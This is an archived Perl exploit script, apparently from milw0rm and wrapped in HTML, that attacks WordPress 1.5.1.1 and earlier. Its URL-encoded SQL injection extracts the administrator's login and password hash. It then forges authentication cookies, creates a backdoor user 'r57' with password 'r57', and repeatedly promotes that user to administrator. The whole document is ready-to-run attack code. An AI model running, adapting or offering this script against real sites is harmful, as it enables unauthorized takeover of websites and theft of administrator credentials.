@@ -1,0 +1,112 @@
+<html><head><title>WordPress <= 1.5.1.1 "add new admin" SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
+
+## WordPress &lt;= 1.5.1.1 sql injection &quot;add new admin&quot; exploit
+## by RST/GHC , http://rst.void.ru , http://ghc.ru
+## coded by 1dt.w0lf
+
+use LWP::UserAgent;
+use Getopt::Std;
+use HTTP::Cookies;
+use Digest::MD5 qw(md5_hex);
+getopts('h:p:');
+
+$path = $opt_h;
+$pref = $opt_p || 'wp_';
+
+if(!$path) { usage(); }
+
+$xpl = LWP::UserAgent-&gt;new() or die;
+&amp;header();
+print &quot; +---[x] STEP 1 - TRY GET ADMIN INFO\n&quot;;
+$reg  = $path;
+$reg .= '?%63%61%74=%36%36%36%20%75%6E%69%6F%6E%20%73%65%6C%65%63%74%20%36%36%36%2C%63%6F%6E'.
+        '%63%61%74%28%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%6C%6F%67%69'.
+        '%6E%2C%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%70%61%73%73%2C%63'.
+        '%68%61%72%28%35%38%2C%35%38%2C%35%38%29%29%2C%6E%75%6C%6C%2C%6E%75%6C%6C%2C%6E%75%6C'.
+        '%6C%20%66%72%6F%6D%20'.$pref.'%75%73%65%72%73%20%57%48%45%52%45%20%49%44=1'; ### 1 - admin ID
+$res = $xpl-&gt;get($reg);
+die &quot;ERROR : &quot;, $res-&gt;status_line unless $res-&gt;is_success;
+if($res-&gt;content =~ m/(?::::)(.*)(?::::)([a-f0-9]{32})(?::::)(&lt;\/title&gt;)/) 
+  { 
+  $login = $1; $hash = $2; 
+  print &quot;\n&gt;&gt; LOGIN : $login\n&gt;&gt;  HASH : $hash\n\n&quot;;
+  }
+else { print &quot;ERROR : Forum not vulnerable or bad prefix.&quot;; exit(); }
+
+$cookie_jar = HTTP::Cookies-&gt;new();
+($cpath = $path) =~ s!/$!!;
+$hash  = md5_hex($hash);
+($host   = $cpath) =~ s!http://([^/]*).*!$1!;
+$cpath = md5_hex($cpath);
+
+$xpl-&gt;cookie_jar( $cookie_jar );
+
+$cookie_jar-&gt;set_cookie( &quot;0&quot;,&quot;wordpresspass_$cpath&quot;,&quot;$hash&quot;,&quot;/&quot;,$host,,,,,);
+$cookie_jar-&gt;set_cookie( &quot;1&quot;,&quot;wordpressuser_$cpath&quot;,&quot;$login&quot;,&quot;/&quot;,$host,,,,,);
+print &quot; +---[x] STEP 2 - CREATE NEW USER\n&quot;;
+$reg  = $path;
+$reg .= 'wp-admin/users.php';
+$res = $xpl-&gt;post(&quot;$reg&quot;,
+{
+ &quot;action&quot;     =&gt; &quot;adduser&quot;,
+ &quot;user_login&quot; =&gt; &quot;r57&quot;,
+ &quot;firstname&quot;  =&gt; &quot;RST&quot;,
+ &quot;lastname&quot;   =&gt; &quot;GHC&quot;,
+ &quot;email&quot;      =&gt; &quot;billy\@microsoft.com&quot;,
+ &quot;uri&quot;        =&gt; &quot;http://rst.void.ru&quot;,
+ &quot;pass1&quot;      =&gt; &quot;r57&quot;,
+ &quot;pass2&quot;      =&gt; &quot;r57&quot;,
+ &quot;adduser&quot;    =&gt; &quot;Submit&quot;,
+},
+Referer =&gt; $reg
+);
+print &quot; +---[x] STEP 3 - GET ID OF NEW USER\n&quot;;
+$reg  = $path;
+$reg .= 'wp-admin/users.php';
+$res = $xpl-&gt;get(&quot;$reg&quot;,Referer =&gt; $reg);
+@res = split(/\n/,$res-&gt;content);
+$id = 0;
+for(@res)
+ {
+  if(/(?:\&lt;td align=\'center\'\&gt;)([0-9]*)(?:\&lt;\/td\&gt;)/) { $id = $1; }
+  if(/\&lt;td\&gt;\&lt;strong\&gt;r57\&lt;\/strong\&gt;\&lt;\/td\&gt;/) { last; }
+ }
+die &quot;ERROR : &quot;, $res-&gt;status_line unless $res-&gt;is_success;
+if($id != 0) { print &quot;\n&gt;&gt; ID : $id\n\n&quot;; }
+else { print &quot;[-] ERROR : CAN'T GET NEW USER ID\n&quot;; exit(); }
+print &quot; +---[x] STEP 4 - LEVEL UP FOR NEW USER\n\n&quot;;
+$reg  = $path;
+$reg .= 'wp-admin/users.php?action=promote&amp;id='.$id.'&amp;prom=up';
+for($i=0;$i&lt;10;$i++)
+{
+print &quot;&gt;&gt; LEVEL UP # $i\n&quot;;
+$res = $xpl-&gt;get(&quot;$reg&quot;,Referer =&gt; $reg);
+die &quot;ERROR : &quot;, $res-&gt;status_line unless $res-&gt;is_success;
+}
+print &quot;\nTHATS ALL. NOW YOU CAN LOGIN WITH USERNAME 'r57' AND PASSWORD 'r57'\n&quot;;
+
+sub usage()
+{
+ &amp;header();
+ print &quot;USAGE : r57wp.pl [OPTIONS]\n&quot;;
+ print &quot;\noptions:\n\n&quot;;
+ print &quot;-h [path]\n&quot;;
+ print &quot;	Path to wordpress installed\n&quot;;
+ print &quot;-p [prefix] (optional)\n&quot;;
+ print &quot;	Database tables prefix (default 'wp_')\n\n&quot;;
+ print &quot;e.g.: r57wp.pl -h http://blah.com/wordpress/\n&quot;;
+ print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
+ print &quot;(c)oded by 1dt.w0lf\n&quot;;
+ print &quot;RST/GHC\n&quot;;
+ print &quot;http://ghc.ru\n&quot;;
+ print &quot;http://rst.void.ru\n&quot;;
+ exit();
+}
+sub header()
+{
+ print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
+ print &quot;                 WordPress 1.5.1.1 exploit                 \n&quot;;
+ print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
+}
+
+# milw0rm.com [2005-06-21]</pre></html>
